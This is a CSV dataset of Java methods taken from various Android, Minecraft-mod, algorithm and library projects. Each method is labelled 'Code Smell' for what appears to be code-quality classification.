text,label,text_label
"public void returnSearchBarPosition(){
  returnSearchBarPosition(true);
}
@SuppressWarnings(""SimplifiableIfStatement"") public void returnSearchBarPosition(boolean animation){
  if (mSearchBar.getHeight() == 0) {
    return;
  }
  boolean show;
  if (mHelper.forceShowSearchBar()) {
    show=true;
  }
 else {
    RecyclerView recyclerView=mHelper.getValidRecyclerView();
    if (recyclerView == null) {
      return;
    }
    if (!recyclerView.isShown()) {
      show=true;
    }
 else     if (recyclerView.computeVerticalScrollOffset() < mSearchBar.getBottom()) {
      show=true;
    }
 else {
      show=(int)ViewUtils.getY2(mSearchBar) > (mSearchBar.getHeight()) / 2;
    }
  }
  int offset;
  if (show) {
    offset=-(int)mSearchBar.getTranslationY();
  }
 else {
    offset=-(int)ViewUtils.getY2(mSearchBar);
  }
  if (offset == 0) {
    return;
  }
  if (animation) {
    if (mSearchBarMoveAnimator != null) {
      if (mShow == show) {
        return;
      }
 else {
        mSearchBarMoveAnimator.cancel();
        mSearchBarMoveAnimator=null;
      }
    }
    mShow=show;
    final ValueAnimator va=ValueAnimator.ofInt(0,offset);
    va.setDuration(ANIMATE_TIME);
    va.addListener(new SimpleAnimatorListener(){
      @Override public void onAnimationEnd(      Animator animation){
        mSearchBarMoveAnimator=null;
      }
    }
);
    va.addUpdateListener(new ValueAnimator.AnimatorUpdateListener(){
      int lastValue;
      @Override public void onAnimationUpdate(      ValueAnimator animation){
        int value=(Integer)animation.getAnimatedValue();
        int offsetStep=value - lastValue;
        lastValue=value;
        ViewUtils.translationYBy(mSearchBar,offsetStep);
      }
    }
);
    mSearchBarMoveAnimator=va;
    va.start();
  }
 else {
    if (mSearchBarMoveAnimator != null) {
      mSearchBarMoveAnimator.cancel();
    }
    ViewUtils.translationYBy(mSearchBar,offset);
  }
}",1,Code Smell
"@Unique private void updateRemovedLightmaps(){
  while (!this.removedLightmaps.isEmpty()) {
    long sectionPos=this.removedLightmaps.iterator().nextLong();
    if (!this.enabledChunks.contains(ChunkSectionPos.withZeroY(sectionPos))) {
      continue;
    }
    long removedLightmapPosAbove=sectionPos;
    int y=ChunkSectionPos.unpackY(sectionPos);
    final int height=this.getHeight(ChunkSectionPos.withZeroY(sectionPos));
    if (height == this.getMinHeight()) {
      y=height;
    }
 else {
      for (; y < height; ++y) {
        sectionPos=ChunkSectionPosHelper.updateYLong(sectionPos,y);
        if (this.hasLightmap(sectionPos)) {
          break;
        }
        if (this.removedLightmaps.contains(sectionPos)) {
          removedLightmapPosAbove=sectionPos;
        }
      }
    }
    final ChunkNibbleArray lightmapAbove;
    if (y >= height) {
      lightmapAbove=this.isSectionEnabled(sectionPos) ? DIRECT_SKYLIGHT_MAP : EMPTY_SKYLIGHT_MAP;
    }
 else {
      lightmapAbove=this.vanillaLightmapComplexities.get(sectionPos) == 0 ? EMPTY_SKYLIGHT_MAP : this.getLightSection(sectionPos,true);
    }
    this.updateVanillaLightmapsBelow(removedLightmapPosAbove,lightmapAbove);
  }
}",1,Code Smell
"private static void animalReserve(){
  try {
    String s=ReserveRpcCall.queryTreeItemsForExchange();
    if (s == null) {
      Thread.sleep(RandomUtils.delay());
      s=ReserveRpcCall.queryTreeItemsForExchange();
    }
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONArray ja=jo.getJSONArray(""treeItems"");
      for (int i=0; i < ja.length(); i++) {
        jo=ja.getJSONObject(i);
        if (!jo.has(""projectType""))         continue;
        if (!""RESERVE"".equals(jo.getString(""projectType"")))         continue;
        if (!""AVAILABLE"".equals(jo.getString(""applyAction"")))         continue;
        String projectId=jo.getString(""itemId"");
        String itemName=jo.getString(""itemName"");
        int energy=jo.getInt(""energy"");
        ReserveIdMap.putIdMap(projectId,itemName + ""("" + energy+ ""g)"");
        int index=-1;
        for (int j=0; j < Config.getReserveList().size(); j++) {
          if (Config.getReserveList().get(j).equals(projectId)) {
            index=j;
            break;
          }
        }
        if (index < 0)         continue;
        int reserveCount=Config.getReserveCountList().get(index);
        if (reserveCount <= 0)         continue;
        if (!Statistics.canReserveToday(projectId,reserveCount))         continue;
        exchangeTree(projectId,itemName,reserveCount);
      }
    }
 else {
      Log.i(TAG,jo.getString(""resultDesc""));
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""animalReserve err:"");
    Log.printStackTrace(TAG,t);
  }
  ReserveIdMap.saveIdMap();
}",1,Code Smell
"private void selectSetAfterSearch(TLRPC.TL_messages_stickerSet set){
  int prevIndex=selectedStickerSetIndex;
  if (set == null) {
    if (selectedStickerSet != null) {
      BulletinFactory.of(GroupStickersActivity.this).createSimpleBulletin(R.raw.done,LocaleController.getString(R.string.GroupsEmojiPackUpdated)).show();
    }
    selectedStickerSet=null;
    removeStickerSet=true;
  }
 else {
    selectedStickerSet=set;
    removeStickerSet=false;
    BulletinFactory.of(GroupStickersActivity.this).createSimpleBulletin(R.raw.done,LocaleController.getString(R.string.GroupsEmojiPackUpdated)).show();
  }
  updateSelectedStickerSetIndex();
  updateCurrentPackVisibility(selectedStickerSet,false);
  if (prevIndex != -1) {
    boolean found=false;
    if (!searching) {
      for (int i=0; i < listView.getChildCount(); i++) {
        View ch=listView.getChildAt(i);
        if (listView.getChildViewHolder(ch).getAdapterPosition() == stickersStartRow + prevIndex) {
          ((StickerSetCell)ch).setChecked(false,true);
          found=true;
          break;
        }
      }
    }
    if (!found) {
      listAdapter.notifyItemChanged(stickersStartRow + prevIndex);
    }
  }
  if (selectedStickerSetIndex != -1) {
    boolean found=false;
    if (!searching) {
      for (int i=0; i < listView.getChildCount(); i++) {
        View ch=listView.getChildAt(i);
        if (listView.getChildViewHolder(ch).getAdapterPosition() == stickersStartRow + selectedStickerSetIndex) {
          ((StickerSetCell)ch).setChecked(true,true);
          found=true;
          break;
        }
      }
    }
    if (!found) {
      listAdapter.notifyItemChanged(stickersStartRow + selectedStickerSetIndex);
    }
  }
}",1,Code Smell
"public static int dp3(int[] arr,int aim){
  if (aim == 0) {
    return 0;
  }
  Info info=getInfo(arr);
  int[] c=info.coins;
  int[] z=info.zhangs;
  int N=c.length;
  int[][] dp=new int[N + 1][aim + 1];
  dp[N][0]=0;
  for (int j=1; j <= aim; j++) {
    dp[N][j]=Integer.MAX_VALUE;
  }
  for (int i=N - 1; i >= 0; i--) {
    for (int mod=0; mod < Math.min(aim + 1,c[i]); mod++) {
      LinkedList<Integer> w=new LinkedList<>();
      w.add(mod);
      dp[i][mod]=dp[i + 1][mod];
      for (int r=mod + c[i]; r <= aim; r+=c[i]) {
        while (!w.isEmpty() && (dp[i + 1][w.peekLast()] == Integer.MAX_VALUE || dp[i + 1][w.peekLast()] + compensate(w.peekLast(),r,c[i]) >= dp[i + 1][r])) {
          w.pollLast();
        }
        w.addLast(r);
        int overdue=r - c[i] * (z[i] + 1);
        if (w.peekFirst() == overdue) {
          w.pollFirst();
        }
        if (dp[i + 1][w.peekFirst()] == Integer.MAX_VALUE) {
          dp[i][r]=Integer.MAX_VALUE;
        }
 else {
          dp[i][r]=dp[i + 1][w.peekFirst()] + compensate(w.peekFirst(),r,c[i]);
        }
      }
    }
  }
  return dp[0][aim];
}",1,Code Smell
"static KeyValueMarshaler create(AttributeKey<?> key,Object value){
  byte[] keyUtf8=MarshalerUtil.toBytes(key.getKey());
  ProtoEnumInfo valueType=ValueType.STRING;
  byte[] vStrUtf8=EMPTY_BYTES;
  boolean vBool=false;
  long vInt64=0;
  double vFloat64=0;
  if (value instanceof Supplier) {
    value=((Supplier<?>)value).get();
  }
switch (key.getType()) {
case STRING:
    valueType=ValueType.STRING;
  vStrUtf8=MarshalerUtil.toBytes(String.valueOf(value));
break;
case BOOLEAN:
valueType=ValueType.BOOL;
vBool=(boolean)value;
break;
case LONG:
valueType=ValueType.INT64;
vInt64=(long)value;
break;
case DOUBLE:
valueType=ValueType.FLOAT64;
vFloat64=(double)value;
break;
case STRING_ARRAY:
case BOOLEAN_ARRAY:
case LONG_ARRAY:
case DOUBLE_ARRAY:
valueType=ValueType.STRING;
try {
vStrUtf8=JSON.std.asBytes(value);
}
 catch (IOException e) {
}
break;
}
return new KeyValueMarshaler(keyUtf8,valueType,vStrUtf8,vBool,vInt64,vFloat64);
}",1,Code Smell
"/** 
 * Sets the currently selected hour using a 24-hour time.
 * @param hour the hour to set, in the range (0-23)
 * @see #getHour()
 */
public void setHour(@IntRange(from=0,to=23) int hour){
  if (hour < 0 || hour > 23) {
    throw new IllegalArgumentException(""hour: "" + hour + "" is not in [0-23] range in"");
  }
  mCurrentHour=hour;
  if (!is24Hour()) {
    if (mCurrentHour >= HOURS_IN_HALF_DAY) {
      mCurrentAmPmIndex=PM_INDEX;
      if (mCurrentHour > HOURS_IN_HALF_DAY) {
        mCurrentHour-=HOURS_IN_HALF_DAY;
      }
    }
 else {
      mCurrentAmPmIndex=AM_INDEX;
      if (mCurrentHour == 0) {
        mCurrentHour=HOURS_IN_HALF_DAY;
      }
    }
    setAmPmValue();
  }
  setColumnValue(mColHourIndex,mCurrentHour,false);
}",1,Code Smell
"public void draw(Canvas canvas,View view){
  draw(canvas,view,view.getWidth(),view.getHeight(),1f);
}
public void draw(Canvas canvas,View view,int w,int h){
  draw(canvas,view,w,h,1f);
}
public void draw(Canvas canvas,View view,int w,int h,float alpha){
  draw(canvas,view,w,h,alpha,false);
}
public void draw(Canvas canvas,View view,int w,int h,float alpha,boolean toBitmap){
  if (canvas == null || view == null) {
    return;
  }
  canvas.save();
  int ow=width, oh=height;
  Integer index=holdersToIndex.get(view);
  if (index == null) {
    index=0;
  }
  if ((index % 4) == 1) {
    canvas.rotate(180,ow / 2f,oh / 2f);
  }
  if ((index % 4) == 2) {
    canvas.scale(-1,1,ow / 2f,oh / 2f);
  }
  if ((index % 4) == 3) {
    canvas.scale(1,-1,ow / 2f,oh / 2f);
  }
  canvas.translate(w / 2f,h / 2f);
  if (w > ow || h > oh) {
    final float scale=Math.max(w / (float)ow,h / (float)oh);
    canvas.scale(scale,scale);
  }
  canvas.translate(-w / 2f,-h / 2f);
  if (toBitmap) {
    Bitmap bitmap=textureView.getBitmap();
    if (bitmap != null) {
      Paint paint=new Paint(Paint.DITHER_FLAG | Paint.FILTER_BITMAP_FLAG | Paint.ANTI_ALIAS_FLAG);
      paint.setColor(Color.WHITE);
      canvas.drawBitmap(bitmap,0,0,paint);
      bitmap.recycle();
    }
  }
 else {
    textureView.setAlpha(alpha);
    textureView.draw(canvas);
  }
  canvas.restore();
}",1,Code Smell
"private void onMeasureInternal(int widthMeasureSpec,int heightMeasureSpec){
  int widthSize=MeasureSpec.getSize(widthMeasureSpec);
  int heightSize=MeasureSpec.getSize(heightMeasureSpec);
  widthSize-=backgroundPaddingLeft * 2;
  int keyboardSize=0;
  if (!commentTextView.isWaitingForKeyboardOpen() && keyboardSize <= AndroidUtilities.dp(20) && !commentTextView.isPopupShowing() && !commentTextView.isAnimatePopupClosing()) {
    ignoreLayout=true;
    commentTextView.hideEmojiView();
    ignoreLayout=false;
  }
  ignoreLayout=true;
  if (keyboardSize <= AndroidUtilities.dp(20)) {
    if (!AndroidUtilities.isInMultiwindow) {
      int paddingBottom;
      if (keyboardVisible) {
        paddingBottom=0;
      }
 else {
        paddingBottom=commentTextView.getEmojiPadding();
      }
      heightSize-=paddingBottom;
      heightMeasureSpec=MeasureSpec.makeMeasureSpec(heightSize,MeasureSpec.EXACTLY);
    }
    int visibility=commentTextView.isPopupShowing() ? GONE : VISIBLE;
    if (pickerBottomLayout != null) {
      pickerBottomLayout.setVisibility(visibility);
      if (sharesCountLayout != null) {
        sharesCountLayout.setVisibility(visibility);
      }
    }
  }
 else {
    commentTextView.hideEmojiView();
    if (pickerBottomLayout != null) {
      pickerBottomLayout.setVisibility(GONE);
      if (sharesCountLayout != null) {
        sharesCountLayout.setVisibility(GONE);
      }
    }
  }
  ignoreLayout=false;
  int childCount=getChildCount();
  for (int i=0; i < childCount; i++) {
    View child=getChildAt(i);
    if (child == null || child.getVisibility() == GONE) {
      continue;
    }
    if (commentTextView != null && commentTextView.isPopupView(child)) {
      if (AndroidUtilities.isInMultiwindow || AndroidUtilities.isTablet()) {
        if (AndroidUtilities.isTablet()) {
          child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(Math.min(AndroidUtilities.dp(AndroidUtilities.isTablet() ? 200 : 320),heightSize - AndroidUtilities.statusBarHeight + getPaddingTop()),MeasureSpec.EXACTLY));
        }
 else {
          child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(heightSize - AndroidUtilities.statusBarHeight + getPaddingTop(),MeasureSpec.EXACTLY));
        }
      }
 else {
        child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(child.getLayoutParams().height,MeasureSpec.EXACTLY));
      }
    }
 else {
      measureChildWithMargins(child,widthMeasureSpec,0,heightMeasureSpec,0);
    }
  }
}",1,Code Smell
"@Override public ItemRequirement getRequiredItems(BlockState state,BlockEntity be){
  int sameTypeTrackAmount=1;
  Object2IntMap<TrackMaterial> otherTrackAmounts=new Object2IntArrayMap<>();
  int girderAmount=0;
  if (be instanceof TrackBlockEntity) {
    for (    BezierConnection bezierConnection : track.getConnections().values()) {
      if (!bezierConnection.isPrimary())       continue;
      TrackMaterial material=bezierConnection.getMaterial();
      if (material == getMaterial()) {
        sameTypeTrackAmount+=bezierConnection.getTrackItemCost();
      }
 else {
        otherTrackAmounts.put(material,otherTrackAmounts.getOrDefault(material,0) + 1);
      }
      girderAmount+=bezierConnection.getGirderItemCost();
    }
  }
  List<ItemStack> stacks=new ArrayList<>();
  while (sameTypeTrackAmount > 0) {
    stacks.add(new ItemStack(state.getBlock(),Math.min(sameTypeTrackAmount,64)));
    sameTypeTrackAmount-=64;
  }
  for (  TrackMaterial material : otherTrackAmounts.keySet()) {
    int amt=otherTrackAmounts.getOrDefault(material,0);
    while (amt > 0) {
      stacks.add(material.asStack(Math.min(amt,64)));
      amt-=64;
    }
  }
  while (girderAmount > 0) {
    stacks.add(AllBlocks.METAL_GIRDER.asStack(Math.min(girderAmount,64)));
    girderAmount-=64;
  }
  return new ItemRequirement(ItemUseType.CONSUME,stacks);
}",1,Code Smell
"@Override public void handle(FileData fileData){
  try {
    byte[] raw=fileData.getBytes();
    String relativePath=fileData.getRelativePath();
    int cwFlags=0;
    int crFlags=0;
    for (    MainProcessHandler handler : handlers) {
      cwFlags|=handler.flagForClassWriter();
      if ((handler.flagForClassReader(Process.TRANSFORM) & ClassReader.EXPAND_FRAMES) == ClassReader.EXPAND_FRAMES) {
        crFlags|=ClassReader.EXPAND_FRAMES;
      }
    }
    ClassReader cr=new ClassReader(raw);
    ClassWriter cw=new ClassWriter(cwFlags);
    ClassVisitorChain chain=getClassVisitorChain(relativePath);
    if (needPreVerify) {
      chain.connect(new AsmVerifyClassVisitor());
    }
    if (handlers != null && !handlers.isEmpty()) {
      for (      MainProcessHandler handler : handlers) {
        if (!handler.transform(relativePath,chain)) {
          fileData.delete();
          return;
        }
      }
    }
    ClassNode cn=new SafeClassNode();
    chain.append(cn);
    chain.accept(cr,crFlags);
    for (    MainProcessHandler handler : handlers) {
      if (!handler.transform(relativePath,cn)) {
        fileData.delete();
        return;
      }
    }
    cn.accept(cw);
    raw=cw.toByteArray();
    if (needVerify) {
      ClassNode verifyNode=new ClassNode();
      new ClassReader(raw).accept(verifyNode,crFlags);
      AsmVerifier.verify(verifyNode);
    }
    fileData.setBytes(raw);
  }
 catch (  ByteXException e) {
    throw e;
  }
catch (  Exception e) {
    LevelLog.sDefaultLogger.e(String.format(""Failed to handle class %s"",fileData.getRelativePath()),e);
    if (!GlobalWhiteListManager.INSTANCE.shouldIgnore(fileData.getRelativePath())) {
      if (context != null) {
        throw new RuntimeException(String.format(""%s\n\tFailed to resolve class %s[%s]"",e.getMessage(),fileData.getRelativePath(),Utils.getAllFileCachePath(context,fileData.getRelativePath())),e);
      }
 else {
        throw e;
      }
    }
  }
}",1,Code Smell
"/** 
 * Gets the related tags of the specified tag of the given tag id.
 * @param tagId     the given tag id
 * @param fetchSize the specified fetch size
 * @return related tags, for example,      <pre>[{ ""oId"": """", ""tagTitle"": """", ""tagDescription"": """", .... }, ....] </pre>, returns an empty list if not found
 */
public List<JSONObject> getRelatedTags(final String tagId,final int fetchSize){
  final List<JSONObject> ret=new ArrayList<>();
  final Set<String> tagIds=new HashSet<>();
  try {
    JSONObject result=tagTagRepository.getByTag1Id(tagId,1,fetchSize);
    List<JSONObject> relations=(List<JSONObject>)result.opt(Keys.RESULTS);
    boolean full=false;
    for (    JSONObject relation : relations) {
      tagIds.add(relation.optString(Tag.TAG + ""2_"" + Keys.OBJECT_ID));
      if (tagIds.size() >= fetchSize) {
        full=true;
        break;
      }
    }
    if (!full) {
      result=tagTagRepository.getByTag2Id(tagId,1,fetchSize);
      relations=(List<JSONObject>)result.opt(Keys.RESULTS);
      for (int i=0; i < relations.size(); i++) {
        tagIds.add(relations.get(i).optString(Tag.TAG + ""1_"" + Keys.OBJECT_ID));
        if (tagIds.size() >= fetchSize) {
          break;
        }
      }
    }
    for (    final String tId : tagIds) {
      final JSONObject tag=tagRepository.get(tId);
      if (null != tag) {
        Tag.fillDescription(tag);
        ret.add(tag);
      }
    }
    return ret;
  }
 catch (  final RepositoryException e) {
    LOGGER.log(Level.ERROR,""Gets related tags failed"",e);
    return Collections.emptyList();
  }
}",1,Code Smell
"@Override public void init(){
  Helpers.findAndHookMethod(""com.android.systemui.statusbar.phone.MiuiPhoneStatusBarView"",lpparam.classLoader,""handleEvent"",MotionEvent.class,new MethodHook(){
    @Override protected void before(    MethodHookParam param){
      boolean useCC=(boolean)XposedHelpers.callMethod(XposedHelpers.getObjectField(param.thisObject,""mPanelController""),""isExpandable"");
      if (useCC) {
        FrameLayout bar=(FrameLayout)param.thisObject;
        Object mControlPanelWindowManager=XposedHelpers.getObjectField(param.thisObject,""mControlPanelWindowManager"");
        boolean dispatchToControlPanel=(boolean)XposedHelpers.callMethod(mControlPanelWindowManager,""dispatchToControlPanel"",param.args[0],bar.getWidth());
        if (isAndroidU()) {
          XposedHelpers.setObjectField(mControlPanelWindowManager,""mTransToControlPanel"",dispatchToControlPanel);
        }
 else {
          XposedHelpers.callMethod(mControlPanelWindowManager,""setTransToControlPanel"",dispatchToControlPanel);
        }
        param.setResult(dispatchToControlPanel);
        return;
      }
      param.setResult(false);
    }
  }
);
  Helpers.findAndHookMethod(""com.android.systemui.controlcenter.phone.ControlPanelWindowManager"",lpparam.classLoader,""dispatchToControlPanel"",MotionEvent.class,float.class,new MethodHook(){
    @Override protected void before(    MethodHookParam param){
      boolean added=XposedHelpers.getBooleanField(param.thisObject,""added"");
      if (added) {
        boolean useCC;
        if (isMoreAndroidVersion(33)) {
          useCC=XposedHelpers.getBooleanField(XposedHelpers.getObjectField(param.thisObject,""mControlCenterController""),""useControlCenter"");
        }
 else {
          useCC=(boolean)XposedHelpers.callMethod(XposedHelpers.getObjectField(param.thisObject,""mControlCenterController""),""isExpandable"");
        }
        if (useCC) {
          MotionEvent motionEvent=(MotionEvent)param.args[0];
          if (motionEvent.getActionMasked() == 0) {
            XposedHelpers.setObjectField(param.thisObject,""mDownX"",motionEvent.getRawX());
          }
          Object controlCenterWindowView=XposedHelpers.getObjectField(param.thisObject,""mControlPanel"");
          if (controlCenterWindowView == null) {
            param.setResult(false);
          }
 else {
            float mDownX=XposedHelpers.getFloatField(param.thisObject,""mDownX"");
            float width=(float)param.args[1];
            if (mDownX < width / 2.0f) {
              param.setResult(XposedHelpers.callMethod(controlCenterWindowView,""handleMotionEvent"",motionEvent,true));
            }
 else {
              param.setResult(false);
            }
          }
          return;
        }
      }
      param.setResult(false);
    }
  }
);
}",1,Code Smell
"/** 
 * Adds the words in a name (e.g., firstname/lastname) to the binary dictionary along with their bigrams depending on locale.
 */
private void addNameLocked(final String name){
  int len=StringUtils.codePointCount(name);
  NgramContext ngramContext=NgramContext.getEmptyPrevWordsContext(BinaryDictionary.MAX_PREV_WORD_COUNT_FOR_N_GRAM);
  for (int i=0; i < len; i++) {
    if (Character.isLetter(name.codePointAt(i))) {
      int end=ContactsDictionaryUtils.getWordEndPosition(name,len,i);
      String word=name.substring(i,end);
      if (DEBUG_DUMP) {
        Log.d(TAG,""addName word = "" + word);
      }
      i=end - 1;
      final int wordLen=StringUtils.codePointCount(word);
      if (wordLen <= MAX_WORD_LENGTH && wordLen > 1) {
        if (DEBUG) {
          Log.d(TAG,""addName "" + name + "", ""+ word+ "", ""+ ngramContext);
        }
        runGCIfRequiredLocked(true);
        addUnigramLocked(word,ContactsDictionaryConstants.FREQUENCY_FOR_CONTACTS,null,0,false,false,BinaryDictionary.NOT_A_VALID_TIMESTAMP);
        if (ngramContext.isValid() && mUseFirstLastBigrams) {
          runGCIfRequiredLocked(true);
          addNgramEntryLocked(ngramContext,word,ContactsDictionaryConstants.FREQUENCY_FOR_CONTACTS_BIGRAM,BinaryDictionary.NOT_A_VALID_TIMESTAMP);
        }
        ngramContext=ngramContext.getNextNgramContext(new NgramContext.WordInfo(word));
      }
    }
  }
}",1,Code Smell
"private static <T>T handleCircleReference(T instance){
  LogUtil.verbose(""Verifying "" + instance.getClass());
  try {
    if (instance.getClass().isArray()) {
      for (int i=0; i < Array.getLength(instance); i++) {
        handleCircleReference(Array.get(instance,i),instance.getClass().getComponentType(),new HashMap<Class<?>,Object>(INITIAL_CAPACITY));
      }
    }
 else {
      handleCircleReference(instance,instance.getClass(),new HashMap<Class<?>,Object>(INITIAL_CAPACITY));
    }
  }
 catch (  IllegalAccessException e) {
    throw new ClassConstructionException(""Failed to access field"",e);
  }
  return instance;
}
private static void handleCircleReference(Object instance,Class<?> type,Map<Class<?>,Object> classPool) throws IllegalAccessException {
  if (instance == null) {
    return;
  }
  classPool.put(type,instance);
  for (  Field f : TypeUtil.getAllFields(type)) {
    if (f.getName().startsWith(DOLLAR) || isStaticFinalField(f)) {
      continue;
    }
    f.setAccessible(true);
    Object fieldIns=f.get(instance);
    Class<?> fieldType=f.getType();
    if (fieldType.isArray()) {
      Class<?> componentType=fieldType.getComponentType();
      if (fieldIns != null && !TypeUtil.isBasicType(componentType)) {
        LogUtil.verbose(classPool.size() * 2,""Verifying Field(Array[%d]) %s"",Array.getLength(fieldIns),f.getName());
        handleCircleReferenceOfArrayField(fieldIns,componentType,classPool);
      }
    }
 else     if (!TypeUtil.isBasicType(fieldType)) {
      if (fieldIns == null && classPool.containsKey(fieldType)) {
        f.set(instance,classPool.get(fieldType));
      }
 else       if (!classPool.containsKey(fieldType)) {
        LogUtil.verbose(classPool.size() * 2,""Verifying Field %s"",f.getName());
        handleCircleReference(fieldIns,fieldType,classPool);
      }
    }
  }
  classPool.remove(type);
}",1,Code Smell
"@Override public long open(DataSpec dataSpec) throws HttpDataSourceException {
  Assertions.checkNotNull(dataSpec);
  Assertions.checkState(!opened);
  operation.close();
  resetConnectTimeout();
  currentDataSpec=dataSpec;
  try {
    currentUrlRequest=buildRequestBuilder(dataSpec).build();
  }
 catch (  IOException e) {
    throw new OpenException(e,currentDataSpec,Status.IDLE);
  }
  currentUrlRequest.start();
  transferInitializing(dataSpec);
  try {
    boolean connectionOpened=blockUntilConnectTimeout();
    if (exception != null) {
      throw new OpenException(exception,currentDataSpec,getStatus(currentUrlRequest));
    }
 else     if (!connectionOpened) {
      throw new OpenException(new SocketTimeoutException(),dataSpec,getStatus(currentUrlRequest));
    }
  }
 catch (  InterruptedException e) {
    Thread.currentThread().interrupt();
    throw new OpenException(new InterruptedIOException(e),dataSpec,Status.INVALID);
  }
  int responseCode=responseInfo.getHttpStatusCode();
  if (responseCode < 200 || responseCode > 299) {
    InvalidResponseCodeException exception=new InvalidResponseCodeException(responseCode,responseInfo.getHttpStatusText(),responseInfo.getAllHeaders(),currentDataSpec);
    if (responseCode == 416) {
      exception.initCause(new DataSourceException(DataSourceException.POSITION_OUT_OF_RANGE));
    }
    throw exception;
  }
  if (contentTypePredicate != null) {
    List<String> contentTypeHeaders=responseInfo.getAllHeaders().get(CONTENT_TYPE);
    String contentType=isEmpty(contentTypeHeaders) ? null : contentTypeHeaders.get(0);
    if (!contentTypePredicate.evaluate(contentType)) {
      throw new InvalidContentTypeException(contentType,currentDataSpec);
    }
  }
  bytesToSkip=responseCode == 200 && dataSpec.position != 0 ? dataSpec.position : 0;
  if (!getIsCompressed(responseInfo)) {
    if (dataSpec.length != C.LENGTH_UNSET) {
      bytesRemaining=dataSpec.length;
    }
 else {
      bytesRemaining=getContentLength(responseInfo);
    }
  }
 else {
    bytesRemaining=currentDataSpec.length;
  }
  opened=true;
  transferStarted(dataSpec);
  return bytesRemaining;
}",1,Code Smell
"private List<Pair<Integer,Integer>> calcChooseSeatLevelPairList(int[][] actualSeats,List<String> chooseSeatList){
  String firstChooseSeat=chooseSeatList.get(0);
  int firstSeatX=Integer.parseInt(firstChooseSeat.substring(1));
  int firstSeatY=SEAT_Y_INT.get(firstChooseSeat.charAt(0));
  List<Pair<Integer,Integer>> chooseSeatLevelPairList=new ArrayList<>();
  chooseSeatLevelPairList.add(new Pair<>(firstSeatX,firstSeatY));
  int minLevelX=0;
  for (int i=1; i < chooseSeatList.size(); i++) {
    String chooseSeat=chooseSeatList.get(i);
    int chooseSeatX=Integer.parseInt(chooseSeat.substring(1));
    int chooseSeatY=SEAT_Y_INT.get(chooseSeat.charAt(0));
    minLevelX=Math.min(minLevelX,chooseSeatX - firstSeatX);
    chooseSeatLevelPairList.add(new Pair<>(chooseSeatX - firstSeatX,chooseSeatY - firstSeatY));
  }
  for (int i=Math.abs(minLevelX); i < 7; i++) {
    List<Pair<Integer,Integer>> sureSeatList=new ArrayList<>();
    if (actualSeats[i][firstSeatY] == 0) {
      sureSeatList.add(new Pair<>(i,firstSeatY));
      for (int j=1; j < chooseSeatList.size(); j++) {
        Pair<Integer,Integer> pair=chooseSeatLevelPairList.get(j);
        int chooseSeatX=pair.getKey();
        int chooseSeatY=pair.getValue();
        int x=i + chooseSeatX;
        if (x >= 7) {
          return Collections.emptyList();
        }
        if (actualSeats[i + chooseSeatX][firstSeatY + chooseSeatY] == 0) {
          sureSeatList.add(new Pair<>(i + chooseSeatX,firstSeatY + chooseSeatY));
        }
 else {
          break;
        }
      }
    }
    if (sureSeatList.size() == chooseSeatList.size()) {
      return sureSeatList;
    }
  }
  return Collections.emptyList();
}",1,Code Smell
